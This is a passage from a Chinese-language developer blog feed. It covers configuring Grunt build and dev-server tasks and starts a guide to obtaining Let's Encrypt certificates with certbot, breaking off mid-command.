&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;grunt_project&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;main&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;index.js&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;scripts&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;echo \&quot;Error: no test specified\&quot; &amp;amp;&amp;amp; exit 1&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;author&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;license&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;ISC&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.4.5&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-connect&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.11.2&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-watch&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.6.1&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Gruntfile-js&quot;&gt;&lt;a href=&quot;#Gruntfile-js&quot; class=&quot;headerlink&quot; title=&quot;Gruntfile.js&quot;&gt;&lt;/a&gt;Gruntfile.js&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;module.exports = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(grunt) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// Project configuration.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;grunt.initConfig(&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  uglify: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      mangle: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    build: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;assets/config.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/config.js&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;         &lt;span class=&quot;string&quot;&gt;&#39;assets/smeite.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/smeite.js&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	 &lt;span class=&quot;string&quot;&gt;&#39;assets/index.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/index.js&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cssmin: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  compress: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/all.min.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/base.css&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;css/global.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; // smeite: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //  files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //    &lt;span class=&quot;string&quot;&gt;&#39;assets/smeite.all.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;/play21/smeite.com/public/assets/css/**/*.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; // &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  with_banner: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      banner: &lt;span class=&quot;string&quot;&gt;&#39;/* My minified css file test test */&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/min/base.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/base.css&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/min/global.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/global.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  // Load the plugin that provides the &lt;span class=&quot;string&quot;&gt;&quot;uglify&quot;&lt;/span&gt; task.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-uglify&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-cssmin&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  // Default task(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.registerTask(&lt;span class=&quot;string&quot;&gt;&#39;default&#39;&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;&#39;uglify&#39;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我自己配置的：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;module.exports = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (grunt) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.initConfig(&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        pkg: grunt.file.readJSON(&lt;span class=&quot;string&quot;&gt;&#39;package.json&#39;&lt;/span&gt;),&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        connect:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            yjklog:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:8088, 端口&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjklog/front&#39;&lt;/span&gt;, 文件后台的日志查询的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.133&#39;&lt;/span&gt; 本机机器&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            yjk:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:8080, 端口&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjk/front&#39;&lt;/span&gt;, 后台&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.133&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            jgs:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                options:&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    port:80,  端口&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    base:&lt;span class=&quot;string&quot;&gt;&#39;yjk/jgs&#39;&lt;/span&gt;, 项目后台访问&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    livereload:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    hostname:&lt;span class=&quot;string&quot;&gt;&#39;192.168.1.182&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        watch: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                livereload: &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= connect.yjklog.options.livereload %&amp;gt;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            files: [&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= pkg.root %&amp;gt;/app/**/*&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;%= pkg.root %&amp;gt;/assets/**/*&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-connect&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-watch&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    grunt.registerTask(&lt;span class=&quot;string&quot;&gt;&#39;default&#39;&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;&#39;connect&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;watch&#39;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所有在Gruntfile.js 配置了2个grunt插件:grunt-contrib-connect 和 grunt-contrib-watch&lt;br&gt;如果项目只需要压缩js和css文件。所有在Gruntfile.js 配置了2个grunt插件： grunt-contrib-uglify 和 grunt-contrib-cssmin&lt;/p&gt;
&lt;h3 id=&quot;安装-grunt-插件：&quot;&gt;&lt;a href=&quot;#安装-grunt-插件：&quot; class=&quot;headerlink&quot; title=&quot;安装 grunt 插件：&quot;&gt;&lt;/a&gt;安装 grunt 插件：&lt;/h3&gt;&lt;p&gt;在git 客户端键入命令 cd  /health-Grunt; &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;键入命令 npm install grunt-contrib-watch  安装watch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;键入命令 npm install grunt-contrib-connect 安装connect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;键入命令 npm install grunt-contrib-uglify  安装uglify&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;键入命令 npm install  grunt-contrib-cssmin  安装cssmin&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;官方的的话：查看第4步&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;4、 准备相关资料&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;在 &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;Grunt 目录下，创建 js目录，并在js目录下创建文件config.js  smeite.js index.js ，创建css目录，并在css目录下创建base.css 和 global.css。 （这些文件都在Gruntfile.js 有配置，所以需要创建，内容可以随意的写）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5、执行grunt 命令&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;执行js压缩命令 grunt uglify 效果如下&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我参考官网上面我Gruntfile.js 有配置，需要创建这些文件目录。yjk,front,yjklog.&lt;br&gt;后面就是前端事情了。&lt;br&gt;具体的就不详解了！&lt;br&gt;可以查看我github上面有详细的文档。&lt;/p&gt;
&lt;h3 id=&quot;启动服务：&quot;&gt;&lt;a href=&quot;#启动服务：&quot; class=&quot;headerlink&quot; title=&quot;启动服务：&quot;&gt;&lt;/a&gt;启动服务：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;在目录当前后台启动: grunt &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;搭建后台，需要对后台的端口开放防火墙设置。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近弄灰度发布系统，由于最近体检项目需要对css文件和js文件进行压缩，各种比较之后，选择了grunt进行构建。google一下，几乎都是grunt最新版的使用说明 查看gruntjs的入门 Getting started，又是云里雾里的，好吧，只能耐心看文档和不断的实践吧
    
    </summary>
    
    
      <category term="node.js" scheme="http://blog.yangcvo.me/tags/node-js/"/>
    
      <category term="Grunt" scheme="http://blog.yangcvo.me/tags/Grunt/"/>
    
  </entry>
  
  <entry>
    <title>免费 Https证书（Let&#39;S Encrypt）申请与配置</title>
    <link href="http://blog.yangcvo.me/2016/11/24/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E5%85%8D%E8%B4%B9%20Https%20%E8%AF%81%E4%B9%A6%EF%BC%88Let'S%20Encrypt%EF%BC%89%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%85%8D%E7%BD%AE%20/"/>
    <id>http://blog.yangcvo.me/2016/11/24/Web服务技术/申请证书Https/免费 Https 证书（Let'S Encrypt）申请与配置 /</id>
    <published>2016-11-24T09:25:23.000Z</published>
    <updated>2017-04-01T02:03:36.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;免费-Https-证书（Let’S-Encrypt）申请与配置&quot;&gt;&lt;a href=&quot;#免费-Https-证书（Let’S-Encrypt）申请与配置&quot; class=&quot;headerlink&quot; title=&quot;免费 Https 证书（Let’S Encrypt）申请与配置&quot;&gt;&lt;/a&gt;免费 Https 证书（Let’S Encrypt）申请与配置&lt;/h1&gt;&lt;p&gt;之前要申请免费的 https 证书操作步骤相当麻烦，今天看到有人在讨论，就搜索了一下。发现现在申请步骤简单多了。&lt;/p&gt;
&lt;h2 id=&quot;1-下载-certbot&quot;&gt;&lt;a href=&quot;#1-下载-certbot&quot; class=&quot;headerlink&quot; title=&quot;1. 下载 certbot&quot;&gt;&lt;/a&gt;1. 下载 certbot&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/certbot/certbot&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; certbot&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto --help&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;解压打开执行就会有相关提示&lt;/p&gt;
&lt;h2 id=&quot;2-生成免费证书&quot;&gt;&lt;a href=&quot;#2-生成免费证书&quot; class=&quot;headerlink&quot; title=&quot;2. 生成免费证书&quot;&gt;&lt;/a&gt;2. 生成免费证书&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto certonly --webroot --agree-tos -v -t --email 邮箱地址 -w 网站根目录 &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; 网站域名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; 